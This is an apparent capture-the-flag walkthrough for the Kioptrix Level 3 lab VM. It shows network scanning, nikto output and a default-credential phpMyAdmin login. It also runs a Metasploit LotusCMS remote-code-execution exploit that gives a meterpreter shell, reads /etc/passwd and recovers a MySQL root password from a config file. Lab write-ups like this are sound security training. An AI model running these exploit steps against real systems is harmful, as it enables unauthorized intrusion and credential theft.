# Kioptrix Level 3

### Contents

Our target network is `10.0.2.0/24`.

# Footprinting
Find the IP address of the target host via:

```bash
netdiscover -r 10.0.2.0/24
```

For the purpose of this guide we will assume our target is at IP address **10.0.2.9**.

As per the instructions we modify `/etc/hosts` so our target is at **kioptrix3.com**.
# Reconnaisance

We perform an initial scan as follows:

```bash
nmap 10.0.2.9
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
MAC Address: 08:00:27:50:6F:FB (Oracle VirtualBox virtual NIC)
```

Let's check for UDP ports:

```bash
nmap -sU 10.0.2.9
```

Let's do version detection:
```bash
nmap -O 10.0.2.9
```

```
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
```

Now we proceed by examining each of the services on the machine.
Starting with the most interesting.

# HTTP

```bash
nikto -host kioptrix3.com
```

We find a **phpmyadmin** page.

## phpMyAdmin

```
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Server leaks inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 7444 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2019-03-06 11:22:36 (GMT-5) (46 seconds)
```

When we navigate to the admin console via the browser we find we try the following:

```
root:
admin:admin
':
```

This works and we are logged in as `'@localhost`.

The console gives the following information:

```
Server version: 5.0.51a-3ubuntu5.4
phpMyAdmin - 2.11.3deb1ubuntu1.3
MySQL client version: 5.0.51a
```

We can see the following database:
```
information_schema
```
However, at this stage we are unable to use any SQL injection at our current low privilege level.

## LotusCMS

Browsing around the site we can see a blog and a login portal.

The portal states that it is:
> Proudly running on LotusCMS

A simple `searchsploit` on this CMS reveals the following:
https://www.rapid7.com/db/modules/exploit/multi/http/lcms_php_exec.

We used Metasploit to gain a meterpreter shell like follows:

```
use exploit/multi/http/lcms_php_exec
set RHOST kioptrix3.com
set URI /index.php?system=Admin
exploit
```

```
meterpreter > getuid
Server username: www-data (33)

meterpreter > cat /etc/passwd
loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
```

Looking at the PHP files we can see some of the config files. Of interest is `gconfig.php` which contains some GLOBALS:

```PHP
$GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";
$GLOBALS["gallarific_mysql_server"] = "localhost";
$GLOBALS["gallarific_mysql_database"] = "gallery";
$GLOBALS["gallarific_mysql_username"] = "root";
$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
```
